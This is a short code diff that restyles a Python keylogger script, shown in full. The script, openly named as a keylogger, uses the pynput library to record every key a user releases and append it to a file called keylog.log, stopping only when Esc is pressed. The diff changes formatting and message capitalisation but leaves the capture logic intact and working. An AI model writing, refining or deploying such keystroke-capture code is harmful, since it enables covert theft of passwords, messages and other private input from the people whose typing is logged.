@@ -4,22 +4,26 @@
 from pynput import keyboard as k
 
 def log_write(data):
-    with open("keylog.log","a")as file:file.write(str(data))
- 
+    with open("keylog.log", "a") as file:
+        file.write(str(data))
+
+
 def write(key):
-    if(str(key)=="key.esc"):
-        print("keylogger stopped")
+    if str(key) == "key.esc":
+        print("Keylogger stopped")
         return False
+
     try:
         log_write(str(key.char))
-         
     except Exception:
-        log_write("\n"+str(key)+"\n")
+        log_write("\n" + str(key) + "\n")
         return
+
+
 log_write("\nNew session Started\n")
 
 with k.Listener(on_release=write) as l:
- l.join()
+    l.join()
 
 
 ##for wireshark
